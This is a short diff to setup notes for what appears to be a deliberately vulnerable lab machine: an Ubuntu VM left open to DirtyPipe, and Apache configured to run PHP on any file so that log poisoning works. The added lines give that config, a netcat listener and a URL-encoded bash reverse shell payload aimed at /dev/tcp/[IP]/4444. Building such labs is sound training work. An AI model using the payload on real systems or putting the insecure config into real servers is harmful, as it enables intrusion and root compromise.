@@ -25,4 +25,18 @@ sudo cp webserver/* /var/www/html
 
 - Running on Ubuntu VM with outdated kernel vulnerable to dirtypipe (also not a great idea)
     - Once log poisoning is done to get a reverse shell, www-data can create a directory under /tmp/, clone a git repo of a known exploit for DirtyPipe, and get root access.
-    
+
+2/12 - Setting up log poisoning
+How to get Apache to execute PHP on any file:
+    - sudo vim /etc/apache2/apache2.conf
+    - Add the following:
+        <FilesMatch "\.[a-zA-Z0-9]+$">
+            SetHandler application/x-httpd-php
+        </FilesMatch>
+    - sudo service apache2 restart
+
+Get reverse shell:
+    - on attacking machine, `ip a` to get [IP]
+    - nc -lvnp 4444
+    - bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/[IP]/4444%200>%261"
+
